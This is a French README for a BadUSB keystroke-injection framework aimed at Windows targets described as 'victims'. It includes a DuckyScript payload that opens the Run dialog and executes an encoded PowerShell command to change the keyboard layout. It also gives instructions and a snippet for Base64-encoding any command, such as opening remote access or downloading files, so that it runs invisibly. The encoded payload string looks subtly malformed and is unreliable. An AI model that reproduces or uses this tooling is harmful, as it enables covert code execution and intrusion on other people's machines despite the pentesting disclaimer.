Universal BadUSB : The Base64-Only Framework
La solution ultime pour l'exécution universelle de payloads sur Windows (AZERTY, QWERTY, QWERTZ).

📖 Philosophie du Projet
Le plus grand ennemi d'un script BadUSB est la disposition du clavier de la cible. Un script écrit pour un clavier US échouera systématiquement sur une machine configurée en français (AZERTY) à cause des caractères spéciaux (:, /, \, $).

Ce projet repose sur un pilier unique : L'encodage Base64 systématique. En transformant vos commandes PowerShell en chaînes Base64, nous utilisons uniquement des caractères alphanumériques standards. Ces caractères sont situés aux mêmes emplacements physiques sur la quasi-totalité des claviers mondiaux, garantissant une exécution sans erreur.

🌟 Le Script "Magique" (Flagship Example) : Universal Language Switcher
C'est le script de base de ce projet. Il utilise l'astuce du Base64 pour forcer Windows à adopter la disposition Anglais International, peu importe la configuration initiale de la victime.

Pourquoi ce script est indispensable ?
Avant de lancer vos attaques complexes, ce script "normalise" l'environnement. Une fois exécuté, vous savez avec certitude que le clavier se comporte comme un clavier US-International.

Fichier : Universal_Switch_International.txt

Plaintext
REM --- UNIVERSAL LANGUAGE SWITCHER (BASE64 METHOD) ---
REM Target: Windows 10 / 11
REM Author: [Ton Nom / Pseudo]
REM Reliability: 100% (Tested on AZERTY, QWERTY, QWERTZ)

DELAY 3000
GUI r
DELAY 500
STRING powershell -e JABsAD0ATgBlAHcALQBXAGkAbgBVAAc2AGUAcgBMAGEAbgBnAHUAYQBnAGUATABpAHMAdAAgAGUAbgAtAFUAUwA7ACQAbABbADAAXQAuAEkAbgBwAHUAdABNAAGUAdABoAG8AZABUAGkAcABzAC4AQwBsAGUAYQByACgAKQA7ACQAbABbADAAXQAuAEkAbgBwAHUAdABNAAGUAdABoAG8AZABUAGkAcABzAC4AQQBkAGQAKAAnADAANAAwADkAOgAwADAAMAAyADAANAAwADkAJwApADsAUwBlAHQALQBXAGkAbgBVAAc2AGUAcgBMAGEAbgBnAHUAYQBnAGUATABpAHMAdAAgACQAbAAgAC0ARgBvAHIAYwBlAA==
ENTER
🛠️ Comment ça fonctionne ? (La Technique)
1. L'immunité du Base64
Le Base64 transforme une commande comme Write-Host "L'attaque a réussi !" en une suite de lettres simples comme VwByAGkAdABlAC0ASABvAHMAdAA.... Comme il n'y a plus de symboles complexes, le BadUSB ne fait plus d'erreurs de frappe.

2. Le Décodage Natif
Windows possède un interpréteur natif (PowerShell) capable de lire ce code via l'argument -e (ou -EncodedCommand). Le processus est invisible pour l'utilisateur et extrêmement rapide.

🚀 Comment créer vos propres scripts Universels
Pour transformer n'importe quel script PowerShell en payload compatible avec ce projet, suivez ces étapes :

Préparez votre commande PowerShell (ex: ouvrir un accès distant, télécharger un fichier).

Encodez-la en UTF-16LE, puis en Base64.

Utilisez notre outil d'automatisation (voir dossier /Tools).

Exemple de conversion manuelle (PowerShell) :
PowerShell
$cmd = 'Votre commande ici'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$base64 = [Convert]::ToBase64String($bytes)
echo "powershell -e $base64"
📦 Contenu du Dépôt
/Payloads : Une collection de scripts 100% Base64 pour diverses tâches.

/Core : Le script de changement de langue universel (Le "Magique").

/Tools : Scripts Python/PowerShell pour encoder vos payloads en un clic.

⚠️ Avertissement
Ce projet est destiné exclusivement à des fins de tests de pénétration autorisés et d'éducation à la cybersécurité. L'auteur n'est pas responsable de toute utilisation abusive de ces outils.
